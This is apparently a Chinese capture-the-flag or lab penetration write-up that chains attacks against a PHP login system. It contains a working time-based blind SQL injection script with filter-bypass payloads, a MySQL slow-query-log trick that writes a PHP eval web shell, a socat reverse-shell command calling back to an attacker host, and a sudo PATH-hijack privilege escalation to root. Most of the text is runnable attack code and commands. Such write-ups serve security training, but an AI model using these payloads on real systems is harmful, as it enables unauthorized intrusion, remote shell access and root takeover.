取材自某次真实渗透，不说两句话，开发与安全缺一不可。



信息收集：

存在SQL注入漏洞，禁用了双写绕过，大小写绕过等常见绕过形式

SQL过滤了常见的SQL语句如空格，>,<,=等符号

通过抓包可以绕过验证码，只要不访问index.php，不刷新验证码，就可以使用同一个验证码。



可以通过异或盲注和benchmark函数进行盲注。

```python
import requests
import time

head = '''Host: 192.168.174.133:14124
Connection: keep-alive
Content-Length: 37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.174.133:14124
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.174.133:14124/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=7363df76975485eaae419dea46746cb7'''.split("\n")

verifyCode = "tfMs"

url = "http://192.168.174.133:14124/checkLogin.php"

delay = 1.0


headers = {}

for k in head:
	temp = k.split(": ")
	i=temp[0]
	j="".join(temp[1:])
	headers[i] = j

if headers.get("") is not None:
	headers.pop("")



def fetchSQL(sql, pos):
	for i in range(20, 129):
		payload = f"1')/*!UNION*//**//*!SELECT*/(CASE/**/WHEN/**/ASCII(mid(concat(({sql})),{pos},1))^{i}/**/THEN/**/0/**/ELSE/**/BENCHMARK(8000000,md5(1))/**/END)#"
		data = {"user":payload,"password":"1","verifyCode":verifyCode}
		start = time.time()
		connect = requests.post(url,headers=headers,data=data)
		# print(connect.text)
		end = time.time()
		if end - start > delay:
			return i
	return None

def crackSQL(sql):
	strs = ""
	for pos in range(1,100):
		temp = fetchSQL(sql, pos)
		if temp is None:
			break
		print(chr(temp),end="")
		strs += chr(temp)
	print("")
	return strs

def main():
	sql1 = "database()"
	sql2 = "/*!SELECT*//**/group_concat(schema_name)/**/from/**/information_schema.schemata"
	sql3 = "/*!SELECT*//**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'secret'"
	sql4 = "/*!SELECT*//**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'path'"
	sql5 = "/*!SELECT*//**/group_concat(filename)/**/from/**/secret.path"
	sql6 = "/*!SELECT*//**/group_concat(filepath)/**/from/**/secret.path"
	crackSQL(sql1)#手动切换sql

main()
```



发现两个路径

flagggggg__wher_e_14_F5MSsYteUvm21W9w.txt,Mysql_connect_shell.php

访问第一个，得到一句话

```
flag is in the root directory and has root privileges
```

flag以root权限在根目录



访问MySQL那个路径

```php
<?php
require_once "config.php";

if(isset($_POST["sql"])){
    $sql = trim($_POST["sql"]);
    var_dump(fetchOne($sql));
}
else{
    highlight_file(__FILE__);
}

?>
```

发现是执行SQL的后端

sql终端为最高权限，secure_file_priv权限没开启，尝试慢日志注入

```sql
set global slow_query_log=1;
SET GLOBAL slow_query_log_file='/var/www/html/shell.php';
select '<?php eval($_GET[a])?>' or SLEEP(11);
```

分别执行上面3句话

即可访问shell.php

此时获得一句话木马

用一句话木马执行系统命令：apk list，发现有socat

使用socat反弹shell

```shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ip:port
```

反弹shell后提权：

使用sudo -l 查看，发现可以无密码执行/bin/menu

下载下来用ida或者用strings查看menu文件，发现里边的system用的是环境变量，没有用绝对路径

我们修改环境变量中ifconfig的值

```shell
cp /bin/bash /tmp/ifconfig
chmod 777 /tmp/ifconfig
export PATH=/tmp:$PATH
```

此后执行

```shell
sudo menu
```

输入2，获得shell，whoami权限为root

然后用root权限cat /flag.txt即可